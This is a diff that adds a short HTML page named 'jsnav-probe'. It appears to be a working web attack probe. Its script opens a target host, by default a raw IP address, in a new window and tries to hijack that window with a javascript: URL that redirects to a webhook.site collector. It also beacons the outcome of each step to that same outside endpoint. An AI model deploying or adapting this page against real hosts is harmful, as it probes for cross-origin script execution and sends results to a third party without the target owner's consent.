@@ -1,0 +1,26 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>jsnav-probe</title>
+<script>
+const q = new URLSearchParams(location.search);
+const host = q.get('host') || 'https://3.38.205.243';
+function beacon(kind, extra='') {
+  new Image().src = 'https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/' + kind + '?host=' + encodeURIComponent(host) + '&extra=' + encodeURIComponent(extra) + '&t=' + Date.now();
+}
+let w;
+try {
+  w = window.open(host + '/', '_blank');
+  beacon('jnopen', String(!!w));
+} catch (e) {
+  beacon('jnopenerr', e && e.message ? e.message : 'err');
+}
+setTimeout(() => {
+  try {
+    w.location = "javascript:location='https://webhook.site/09513229-f9de-4438-a2b6-12b86e5b4ca2/jsnav?x='+Date.now();void 0";
+    beacon('jnset', 'ok');
+  } catch (e) {
+    beacon('jnseterr', e && e.message ? e.message : 'err');
+  }
+}, 3000);
+</script>
+OK
